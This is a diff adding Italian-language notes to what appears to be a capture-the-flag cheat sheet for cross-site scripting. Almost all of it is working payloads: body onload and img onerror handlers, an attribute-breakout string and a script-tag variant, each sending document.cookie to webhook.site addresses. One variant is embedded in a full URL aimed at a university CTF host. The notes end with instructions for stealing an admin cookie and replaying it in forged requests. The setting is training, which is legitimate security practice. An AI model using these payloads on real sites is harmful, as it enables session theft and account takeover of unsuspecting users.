@@ -14,3 +14,18 @@ Posso usare anche un tag svg in cui inserire lo script
 
 <body onload="var xhr = new XMLHttpRequest(); xhr.open('GET', 'https://webhook.site/0d679ff2-8e95-4324-9e85-c667506d54da/?cookie=' + encodeURIComponent(document.cookie)); xhr.send();"></body>
 
+USA ANCHE DOCUMENT.LOCATION
+<img src="x" onerror="document.location='https://webhook.site/632f609d-fa9b-4e38-9876-b44097f52f54?cookie=' + document.cookie">
+
+se c'è già tag img
+x" onerror="document.location='https://webhook.site/632f609d-fa9b-4e38-9876-b44097f52f54?cookie=' + document.cookie
+
+se ti serve tutto l'url da inviare
+http://ctf.unife.it:13083/posts?text=<img src="x" onerror="document.location='https://webhook.site/632f609d-fa9b-4e38-9876-b44097f52f54?cookie='%2Bdocument.cookie">
+
+per codificare lo spazio
+<script>document.location='https://webhook.site/632f609d-fa9b-4e38-9876-b44097f52f54?cookie='%2Bdocument.cookie</script>
+
+PER CSRF
+rubare il cookie dell'admin con punti di injection, ad esempio mettere script in una query string 
+una volta rubato inviare richiesta con cookie rubato come cokie cojn get o post
